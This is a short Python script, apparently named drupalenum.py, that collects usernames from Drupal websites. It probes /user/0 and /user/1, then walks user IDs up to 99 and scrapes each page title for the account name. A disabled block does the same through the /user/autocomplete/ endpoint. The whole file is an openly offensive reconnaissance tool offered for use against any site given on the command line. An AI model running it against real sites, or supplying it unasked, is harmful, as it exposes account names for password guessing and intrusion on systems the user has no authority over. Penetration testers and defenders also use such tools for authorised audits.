import requests
import json
import re
from sys import argv


def enum(site):
    result = []
    print("You entered the site: " + site)
    """
    url = site + "/user/autocomplete/"
    r = requests.get(url + "a")

    if r.status_code == 200 and r.headers["content-type"] == "application/json":
        #autocomplete enumeration
        print("[*] The site is vulnerable, lets get the users")
        letters = "abcdefghijklmnopqrstuvwxyz123456789"
        for l in letters:
            print("Getting users starting with the letter: " + l)
            r = requests.get(url + l)
            parsed = json.loads(r.text)
            for i in parsed:
                result.append(i)
    """
    url = site + "/user/"
    r0 = requests.get(url + "0")
    r1 = requests.get(url + "1")
    

    if r0.status_code == 403 or r1.status_code == 200:
        #uid enumeration
        print("[*] The site is vulnerable, lets get the users")
        for i in range(100):
            print("Getting user with uid: " + str(i))
            r = requests.get(url + str(i))
            if r.status_code == 200:
                title = re.search('<title>(.*?)</title>', r.text)
                if title:
                    username = title.group(1).split("|")[0].strip()
                    result.append(username)


    print("[*] Number of users found: " + str(len(result)))
    return set(result) #Only return unique usernames
        
    


if __name__ == "__main__":
    #Enter a site in the format https://example.com as the only argument to the script
    if len(argv) > 1:
        print(enum(argv[1]))
    else:
        print("\n[*] You must enter a site when running the script, e.g (./drupalenum.py https://example.com)\n")